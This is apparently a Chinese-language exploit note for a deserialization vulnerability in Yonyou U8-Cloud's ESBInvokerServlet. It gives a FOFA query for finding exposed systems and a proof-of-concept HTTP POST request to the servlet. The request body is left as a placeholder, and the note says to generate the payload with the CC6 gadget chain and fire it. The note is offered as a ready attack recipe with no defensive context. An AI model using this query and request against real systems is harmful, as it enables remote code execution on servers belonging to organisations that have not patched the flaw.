# 用友u8-cloud系统ESBInvokerServlet存在反序列化漏洞



## fofa

```yaml
app="用友-U8-Cloud"
```

## poc

```
POST /servlet/ESBInvokerServlet HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng, */*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Length: 1123

反序列内容
```

使用使用cc6链生成payload打即可